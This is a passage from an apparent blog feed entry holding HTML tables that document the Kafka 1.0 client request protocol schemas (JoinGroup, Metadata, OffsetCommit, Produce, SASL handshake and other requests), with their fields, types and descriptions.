href="#version-0-20" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>transactional_id</td><td>NULLABLE_STRING</td><td>null</td><td>The transactional id or null if the producer is not transactional</td></tr><tr><td>transaction_timeout_ms</td><td>INT32</td><td>null</td><td>The time in ms to wait for before aborting idle transactions sent by this producer.</td></tr></table>  <h2 id="JoinGroupRequest"><a href="#JoinGroupRequest" class="headerlink" title="JoinGroupRequest"></a>JoinGroupRequest</h2><h3 id="version-0-21"><a href="#version-0-21" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>session_timeout</td><td>INT32</td><td>null</td><td>The coordinator considers the consumer dead if it receives no heartbeat after this timeout in ms.</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr><tr><td>protocol_type</td><td>STRING</td><td>null</td><td>Unique name for class of protocols implemented by group</td></tr><tr><td>group_protocols</td><td>ARRAY({protocol_name:STRING,protocol_metadata:BYTES})</td><td>null</td><td>List of protocols that the member supports</td></tr></table>  <h3 id="version-1-8"><a href="#version-1-8" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>session_timeout</td><td>INT32</td><td>null</td><td>The coordinator considers the consumer dead if it receives no heartbeat after this timeout in ms.</td></tr><tr><td>rebalance_timeout</td><td>INT32</td><td>null</td><td>The maximum time that the coordinator will wait for each member to rejoin when rebalancing the group</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr><tr><td>protocol_type</td><td>STRING</td><td>null</td><td>Unique name for class of protocols implemented by group</td></tr><tr><td>group_protocols</td><td>ARRAY({protocol_name:STRING,protocol_metadata:BYTES})</td><td>null</td><td>List of protocols that the member supports</td></tr></table>  <h3 id="version-2-2"><a href="#version-2-2" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>session_timeout</td><td>INT32</td><td>null</td><td>The coordinator considers the consumer dead if it receives no heartbeat after this timeout in ms.</td></tr><tr><td>rebalance_timeout</td><td>INT32</td><td>null</td><td>The maximum time that the coordinator will wait for each member to rejoin when rebalancing the group</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr><tr><td>protocol_type</td><td>STRING</td><td>null</td><td>Unique name for class of protocols implemented by group</td></tr><tr><td>group_protocols</td><td>ARRAY({protocol_name:STRING,protocol_metadata:BYTES})</td><td>null</td><td>List of protocols that the member supports</td></tr></table>  <h2 id="LeaderAndIsrRequest"><a href="#LeaderAndIsrRequest" class="headerlink" title="LeaderAndIsrRequest"></a>LeaderAndIsrRequest</h2><h3 id="version-0-22"><a href="#version-0-22" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The controller id.</td></tr><tr><td>controller_epoch</td><td>INT32</td><td>null</td><td>The controller epoch.</td></tr><tr><td>partition_states</td><td>ARRAY({topic:STRING,partition:INT32,controller_epoch:INT32,leader:INT32,leader_epoch:INT32,isr:ARRAY(INT32),zk_version:INT32,replicas:ARRAY(INT32)})</td><td>null</td><td>null</td></tr><tr><td>live_leaders</td><td>ARRAY({id:INT32,host:STRING,port:INT32})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-9"><a href="#version-1-9" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The controller id.</td></tr><tr><td>controller_epoch</td><td>INT32</td><td>null</td><td>The controller epoch.</td></tr><tr><td>partition_states</td><td>ARRAY({topic:STRING,partition:INT32,controller_epoch:INT32,leader:INT32,leader_epoch:INT32,isr:ARRAY(INT32),zk_version:INT32,replicas:ARRAY(INT32),is_new:BOOLEAN})</td><td>null</td><td>null</td></tr><tr><td>live_leaders</td><td>ARRAY({id:INT32,host:STRING,port:INT32})</td><td>null</td><td>null</td></tr></table>  <h2 id="LeaveGroupRequest"><a href="#LeaveGroupRequest" class="headerlink" title="LeaveGroupRequest"></a>LeaveGroupRequest</h2><h3 id="version-0-23"><a href="#version-0-23" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr></table>  <h3 id="version-1-10"><a href="#version-1-10" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr></table>  <h2 id="ListGroupsRequest"><a href="#ListGroupsRequest" class="headerlink" title="ListGroupsRequest"></a>ListGroupsRequest</h2><h3 id="version-0-24"><a href="#version-0-24" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr></table>  <h3 id="version-1-11"><a href="#version-1-11" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr></table>  <h2 id="ListOffsetRequest"><a href="#ListOffsetRequest" class="headerlink" title="ListOffsetRequest"></a>ListOffsetRequest</h2><h3 id="version-0-25"><a href="#version-0-25" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>replica_id</td><td>INT32</td><td>null</td><td>Broker id of the follower. For normal consumers, use -1.</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,timestamp:INT64,max_num_offsets:INT32})})</td><td>null</td><td>Topics to list offsets.</td></tr></table>  <h3 id="version-1-12"><a href="#version-1-12" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>replica_id</td><td>INT32</td><td>null</td><td>Broker id of the follower. For normal consumers, use -1.</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,timestamp:INT64})})</td><td>null</td><td>Topics to list offsets.</td></tr></table>  <h3 id="version-2-3"><a href="#version-2-3" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>replica_id</td><td>INT32</td><td>null</td><td>Broker id of the follower. For normal consumers, use -1.</td></tr><tr><td>isolation_level</td><td>INT8</td><td>null</td><td>This setting controls the visibility of transactional records. Using READ_UNCOMMITTED (isolation_level = 0) makes all records visible. With READ_COMMITTED (isolation_level = 1), non-transactional and COMMITTED transactional records are visible. To be more concrete, READ_COMMITTED returns all data from offsets smaller than the current LSO (last stable offset), and enables the inclusion of the list of aborted transactions in the result, which allows consumers to discard ABORTED transactional records</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,timestamp:INT64})})</td><td>null</td><td>Topics to list offsets.</td></tr></table>  <h2 id="MetadataRequest"><a href="#MetadataRequest" class="headerlink" title="MetadataRequest"></a>MetadataRequest</h2><h3 id="version-0-26"><a href="#version-0-26" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY(STRING)</td><td>null</td><td>An array of topics to fetch metadata for. If no topics are specified fetch metadata for all topics.</td></tr></table>  <h3 id="version-1-13"><a href="#version-1-13" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY(STRING)</td><td>null</td><td>An array of topics to fetch metadata for. If the topics array is null fetch metadata for all topics.</td></tr></table>  <h3 id="version-2-4"><a href="#version-2-4" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY(STRING)</td><td>null</td><td>An array of topics to fetch metadata for. If the topics array is null fetch metadata for all topics.</td></tr></table>  <h3 id="version-3-1"><a href="#version-3-1" class="headerlink" title="version:3"></a>version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY(STRING)</td><td>null</td><td>An array of topics to fetch metadata for. If the topics array is null fetch metadata for all topics.</td></tr></table>  <h3 id="version-4-1"><a href="#version-4-1" class="headerlink" title="version:4"></a>version:4</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY(STRING)</td><td>null</td><td>An array of topics to fetch metadata for. If the topics array is null fetch metadata for all topics.</td></tr><tr><td>allow_auto_topic_creation</td><td>BOOLEAN</td><td>null</td><td>If this and the broker config 'auto.create.topics.enable' are true, topics that don't exist will be created by the broker. Otherwise, no topics will be created by the broker.</td></tr></table>  <h3 id="version-5-1"><a href="#version-5-1" class="headerlink" title="version:5"></a>version:5</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY(STRING)</td><td>null</td><td>An array of topics to fetch metadata for. If the topics array is null fetch metadata for all topics.</td></tr><tr><td>allow_auto_topic_creation</td><td>BOOLEAN</td><td>null</td><td>If this and the broker config 'auto.create.topics.enable' are true, topics that don't exist will be created by the broker. Otherwise, no topics will be created by the broker.</td></tr></table>  <h2 id="OffsetCommitRequest"><a href="#OffsetCommitRequest" class="headerlink" title="OffsetCommitRequest"></a>OffsetCommitRequest</h2><h3 id="version-0-27"><a href="#version-0-27" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,offset:INT64,metadata:NULLABLE_STRING})})</td><td>null</td><td>Topics to commit offsets.</td></tr></table>  <h3 id="version-1-14"><a href="#version-1-14" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>The generation of the group.</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,offset:INT64,timestamp:INT64,metadata:NULLABLE_STRING})})</td><td>null</td><td>Topics to commit offsets.</td></tr></table>  <h3 id="version-2-5"><a href="#version-2-5" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>The generation of the group.</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr><tr><td>retention_time</td><td>INT64</td><td>null</td><td>Time period in ms to retain the offset.</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,offset:INT64,metadata:NULLABLE_STRING})})</td><td>null</td><td>Topics to commit offsets.</td></tr></table>  <h3 id="version-3-2"><a href="#version-3-2" class="headerlink" title="version:3"></a>version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>The generation of the group.</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr><tr><td>retention_time</td><td>INT64</td><td>null</td><td>Time period in ms to retain the offset.</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,offset:INT64,metadata:NULLABLE_STRING})})</td><td>null</td><td>Topics to commit offsets.</td></tr></table>  <h2 id="OffsetFetchRequest"><a href="#OffsetFetchRequest" class="headerlink" title="OffsetFetchRequest"></a>OffsetFetchRequest</h2><h3 id="version-0-28"><a href="#version-0-28" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32})})</td><td>null</td><td>Topics to fetch offsets.</td></tr></table>  <h3 id="version-1-15"><a href="#version-1-15" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32})})</td><td>null</td><td>Topics to fetch offsets.</td></tr></table>  <h3 id="version-2-6"><a href="#version-2-6" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32})})</td><td>null</td><td>Topics to fetch offsets. If the topic array is null fetch offsets for all topics.</td></tr></table>  <h3 id="version-3-3"><a href="#version-3-3" class="headerlink" title="version:3"></a>version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32})})</td><td>null</td><td>Topics to fetch offsets. If the topic array is null fetch offsets for all topics.</td></tr></table>  <h2 id="OffsetsForLeaderEpochRequest"><a href="#OffsetsForLeaderEpochRequest" class="headerlink" title="OffsetsForLeaderEpochRequest"></a>OffsetsForLeaderEpochRequest</h2><h3 id="version-0-29"><a href="#version-0-29" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,leader_epoch:INT32})})</td><td>null</td><td>An array of topics to get epochs for</td></tr></table>  <h2 id="ProduceRequest"><a href="#ProduceRequest" class="headerlink" title="ProduceRequest"></a>ProduceRequest</h2><h3 id="version-0-30"><a href="#version-0-30" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>acks</td><td>INT16</td><td>null</td><td>The number of acknowledgments the producer requires the leader to have received before considering a request complete. Allowed values: 0 for no acknowledgments, 1 for only the leader and -1 for the full ISR.</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The time to await a response in ms.</td></tr><tr><td>topic_data</td><td>ARRAY({topic:STRING,data:ARRAY({partition:INT32,record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-16"><a href="#version-1-16" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>acks</td><td>INT16</td><td>null</td><td>The number of acknowledgments the producer requires the leader to have received before considering a request complete. Allowed values: 0 for no acknowledgments, 1 for only the leader and -1 for the full ISR.</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The time to await a response in ms.</td></tr><tr><td>topic_data</td><td>ARRAY({topic:STRING,data:ARRAY({partition:INT32,record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-2-7"><a href="#version-2-7" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>acks</td><td>INT16</td><td>null</td><td>The number of acknowledgments the producer requires the leader to have received before considering a request complete. Allowed values: 0 for no acknowledgments, 1 for only the leader and -1 for the full ISR.</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The time to await a response in ms.</td></tr><tr><td>topic_data</td><td>ARRAY({topic:STRING,data:ARRAY({partition:INT32,record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-3-4"><a href="#version-3-4" class="headerlink" title="version:3"></a>version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>transactional_id</td><td>NULLABLE_STRING</td><td>null</td><td>The transactional id or null if the producer is not transactional</td></tr><tr><td>acks</td><td>INT16</td><td>null</td><td>The number of acknowledgments the producer requires the leader to have received before considering a request complete. Allowed values: 0 for no acknowledgments, 1 for only the leader and -1 for the full ISR.</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The time to await a response in ms.</td></tr><tr><td>topic_data</td><td>ARRAY({topic:STRING,data:ARRAY({partition:INT32,record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-4-2"><a href="#version-4-2" class="headerlink" title="version:4"></a>version:4</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>transactional_id</td><td>NULLABLE_STRING</td><td>null</td><td>The transactional id or null if the producer is not transactional</td></tr><tr><td>acks</td><td>INT16</td><td>null</td><td>The number of acknowledgments the producer requires the leader to have received before considering a request complete. Allowed values: 0 for no acknowledgments, 1 for only the leader and -1 for the full ISR.</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The time to await a response in ms.</td></tr><tr><td>topic_data</td><td>ARRAY({topic:STRING,data:ARRAY({partition:INT32,record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-5-2"><a href="#version-5-2" class="headerlink" title="version:5"></a>version:5</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>transactional_id</td><td>NULLABLE_STRING</td><td>null</td><td>The transactional id or null if the producer is not transactional</td></tr><tr><td>acks</td><td>INT16</td><td>null</td><td>The number of acknowledgments the producer requires the leader to have received before considering a request complete. Allowed values: 0 for no acknowledgments, 1 for only the leader and -1 for the full ISR.</td></tr><tr><td>timeout</td><td>INT32</td><td>null</td><td>The time to await a response in ms.</td></tr><tr><td>topic_data</td><td>ARRAY({topic:STRING,data:ARRAY({partition:INT32,record_set:RECORDS})})</td><td>null</td><td>null</td></tr></table>  <h2 id="SaslAuthenticateRequest"><a href="#SaslAuthenticateRequest" class="headerlink" title="SaslAuthenticateRequest"></a>SaslAuthenticateRequest</h2><h3 id="version-0-31"><a href="#version-0-31" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>sasl_auth_bytes</td><td>BYTES</td><td>null</td><td>SASL authentication bytes from client as defined by the SASL mechanism.</td></tr></table>  <h2 id="SaslHandshakeRequest"><a href="#SaslHandshakeRequest" class="headerlink" title="SaslHandshakeRequest"></a>SaslHandshakeRequest</h2><h3 id="version-0-32"><a href="#version-0-32" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>mechanism</td><td>STRING</td><td>null</td><td>SASL Mechanism chosen by the client.</td></tr></table>  <h3 id="version-1-17"><a href="#version-1-17" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>mechanism</td><td>STRING</td><td>null</td><td>SASL Mechanism chosen by the client.</td></tr></table>  <h2 id="StopReplicaRequest"><a href="#StopReplicaRequest" class="headerlink" title="StopReplicaRequest"></a>StopReplicaRequest</h2><h3 id="version-0-33"><a href="#version-0-33" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The controller id.</td></tr><tr><td>controller_epoch</td><td>INT32</td><td>null</td><td>The controller epoch.</td></tr><tr><td>delete_partitions</td><td>BOOLEAN</td><td>null</td><td>Boolean which indicates if replica's partitions must be deleted.</td></tr><tr><td>partitions</td><td>ARRAY({topic:STRING,partition:INT32})</td><td>null</td><td>null</td></tr></table>  <h2 id="SyncGroupRequest"><a href="#SyncGroupRequest" class="headerlink" title="SyncGroupRequest"></a>SyncGroupRequest</h2><h3 id="version-0-34"><a href="#version-0-34" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>The generation of the group.</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr><tr><td>group_assignment</td><td>ARRAY({member_id:STRING,member_assignment:BYTES})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-18"><a href="#version-1-18" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>generation_id</td><td>INT32</td><td>null</td><td>The generation of the group.</td></tr><tr><td>member_id</td><td>STRING</td><td>null</td><td>The member id assigned by the group coordinator or null if joining for the first time.</td></tr><tr><td>group_assignment</td><td>ARRAY({member_id:STRING,member_assignment:BYTES})</td><td>null</td><td>null</td></tr></table>  <h2 id="TxnOffsetCommitRequest"><a href="#TxnOffsetCommitRequest" class="headerlink" title="TxnOffsetCommitRequest"></a>TxnOffsetCommitRequest</h2><h3 id="version-0-35"><a href="#version-0-35" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>transactional_id</td><td>STRING</td><td>null</td><td>The transactional id corresponding to the transaction.</td></tr><tr><td>group_id</td><td>STRING</td><td>null</td><td>The unique group identifier</td></tr><tr><td>producer_id</td><td>INT64</td><td>null</td><td>Current producer id in use by the transactional id.</td></tr><tr><td>producer_epoch</td><td>INT16</td><td>null</td><td>Current epoch associated with the producer id.</td></tr><tr><td>topics</td><td>ARRAY({topic:STRING,partitions:ARRAY({partition:INT32,offset:INT64,metadata:NULLABLE_STRING})})</td><td>null</td><td>The partitions to write markers for.</td></tr></table>  <h2 id="UpdateMetadataRequest"><a href="#UpdateMetadataRequest" class="headerlink" title="UpdateMetadataRequest"></a>UpdateMetadataRequest</h2><h3 id="version-0-36"><a href="#version-0-36" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The controller id.</td></tr><tr><td>controller_epoch</td><td>INT32</td><td>null</td><td>The controller epoch.</td></tr><tr><td>partition_states</td><td>ARRAY({topic:STRING,partition:INT32,controller_epoch:INT32,leader:INT32,leader_epoch:INT32,isr:ARRAY(INT32),zk_version:INT32,replicas:ARRAY(INT32)})</td><td>null</td><td>null</td></tr><tr><td>live_brokers</td><td>ARRAY({id:INT32,host:STRING,port:INT32})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-1-19"><a href="#version-1-19" class="headerlink" title="version:1"></a>version:1</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The controller id.</td></tr><tr><td>controller_epoch</td><td>INT32</td><td>null</td><td>The controller epoch.</td></tr><tr><td>partition_states</td><td>ARRAY({topic:STRING,partition:INT32,controller_epoch:INT32,leader:INT32,leader_epoch:INT32,isr:ARRAY(INT32),zk_version:INT32,replicas:ARRAY(INT32)})</td><td>null</td><td>null</td></tr><tr><td>live_brokers</td><td>ARRAY({id:INT32,end_points:ARRAY({port:INT32,host:STRING,security_protocol_type:INT16})})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-2-8"><a href="#version-2-8" class="headerlink" title="version:2"></a>version:2</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The controller id.</td></tr><tr><td>controller_epoch</td><td>INT32</td><td>null</td><td>The controller epoch.</td></tr><tr><td>partition_states</td><td>ARRAY({topic:STRING,partition:INT32,controller_epoch:INT32,leader:INT32,leader_epoch:INT32,isr:ARRAY(INT32),zk_version:INT32,replicas:ARRAY(INT32)})</td><td>null</td><td>null</td></tr><tr><td>live_brokers</td><td>ARRAY({id:INT32,end_points:ARRAY({port:INT32,host:STRING,security_protocol_type:INT16}),rack:NULLABLE_STRING})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-3-5"><a href="#version-3-5" class="headerlink" title="version:3"></a>version:3</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The controller id.</td></tr><tr><td>controller_epoch</td><td>INT32</td><td>null</td><td>The controller epoch.</td></tr><tr><td>partition_states</td><td>ARRAY({topic:STRING,partition:INT32,controller_epoch:INT32,leader:INT32,leader_epoch:INT32,isr:ARRAY(INT32),zk_version:INT32,replicas:ARRAY(INT32)})</td><td>null</td><td>null</td></tr><tr><td>live_brokers</td><td>ARRAY({id:INT32,end_points:ARRAY({port:INT32,host:STRING,listener_name:STRING,security_protocol_type:INT16}),rack:NULLABLE_STRING})</td><td>null</td><td>null</td></tr></table>  <h3 id="version-4-3"><a href="#version-4-3" class="headerlink" title="version:4"></a>version:4</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>controller_id</td><td>INT32</td><td>null</td><td>The controller id.</td></tr><tr><td>controller_epoch</td><td>INT32</td><td>null</td><td>The controller epoch.</td></tr><tr><td>partition_states</td><td>ARRAY({topic:STRING,partition:INT32,controller_epoch:INT32,leader:INT32,leader_epoch:INT32,isr:ARRAY(INT32),zk_version:INT32,replicas:ARRAY(INT32),offline_replicas:ARRAY(INT32)})</td><td>null</td><td>null</td></tr><tr><td>live_brokers</td><td>ARRAY({id:INT32,end_points:ARRAY({port:INT32,host:STRING,listener_name:STRING,security_protocol_type:INT16}),rack:NULLABLE_STRING})</td><td>null</td><td>null</td></tr></table>  <h2 id="WriteTxnMarkersRequest"><a href="#WriteTxnMarkersRequest" class="headerlink" title="WriteTxnMarkersRequest"></a>WriteTxnMarkersRequest</h2><h3 id="version-0-37"><a href="#version-0-37" class="headerlink" title="version:0"></a>version:0</h3><table><tr><td style="width:160px">name</td><td>type</td><td  style="width:80px">defaultValue</td><td>docString</td></tr><tr><td>transaction_markers</td><td>ARRAY({producer_id:INT64,producer_epoch:INT16,transaction_result:BOOLEAN,topics:ARRAY({topic:STRING,partitions:ARRAY(INT32)}),coordinator_epoch:INT32})</td><td>null</td><td>The transaction markers to be written.</td></tr></table>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>kafka1.0源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kafka-clients 1.0 内部响应接口文档</title>
    <link href="/2020/04/22/kafka1-0-inner-rpc-doc-reponse/"/>
    <url>/2020/04/22/kafka1-0-inner-rpc-doc-reponse/</url>
    
